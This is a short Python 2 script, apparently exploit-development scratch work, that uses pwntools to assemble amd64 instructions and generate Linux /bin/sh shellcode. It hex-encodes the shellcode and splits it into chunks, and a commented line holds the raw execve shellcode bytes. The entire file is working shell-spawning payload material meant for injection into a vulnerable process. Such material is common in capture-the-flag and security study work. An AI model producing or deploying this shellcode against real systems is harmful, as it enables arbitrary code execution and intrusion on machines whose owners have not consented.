
from pwn import *
context(arch = 'amd64', os = 'linux')

from itertools import *
import binascii

print binascii.hexlify(asm('sub rax,0x33333333'))


print binascii.hexlify(asm('xor eax,eax'))

print pwnlib.shellcraft.amd64.linux.sh()
hexsh = binascii.hexlify(asm(pwnlib.shellcraft.amd64.linux.sh()))
n = 8
separ = [hexsh[i:i+n] for i in range(0, len(hexsh), n)]
print " ".join(separ)
#print disasm("\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05");
